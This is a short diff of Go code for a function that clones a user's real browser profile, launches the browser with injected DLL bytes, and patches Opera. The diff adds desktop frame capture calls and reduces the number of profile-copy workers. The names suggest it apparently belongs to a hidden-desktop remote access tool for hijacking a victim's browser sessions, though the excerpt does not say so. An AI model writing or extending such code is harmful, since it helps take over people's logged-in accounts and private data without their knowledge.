@@ -240,6 +240,7 @@ func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []by
 			return err
 		}
 		notify("launch", true, fmt.Sprintf("process started (PID %d)", pid))
+		RequestDesktopFullFrame()
 		if info.needsPatch && pid != 0 {
 			go func() {
 				defer recoverAndLog("backstage patch opera", nil)
@@ -262,7 +263,9 @@ func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []by
 	}
 	notify("clone", true, fmt.Sprintf("cloning profile from %s", realUserData))
 
+	RequestDesktopFullFrame()
 	cloneDir, err := cloneBrowserProfile(info.name, realUserData, cloneLite, onProgress)
+	RequestDesktopFullFrame()
 	if err != nil {
 		notify("clone", false, fmt.Sprintf("profile clone failed: %v", err))
 		return fmt.Errorf("profile clone failed: %v", err)
@@ -298,6 +301,7 @@ func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []by
 		return err
 	}
 	notify("launch", true, fmt.Sprintf("process started (PID %d)", pid))
+	RequestDesktopFullFrame()
 	if info.needsPatch && pid != 0 {
 		go func() {
 			defer recoverAndLog("backstage patch opera", nil)
@@ -736,7 +740,7 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onPr
 		os.MkdirAll(d, 0700)
 	}
 
-	const numWorkers = 8
+	const numWorkers = 2
 	jobCh := make(chan copyJob, 256)
 	var wg sync.WaitGroup
 	var copiedBytes atomic.Int64
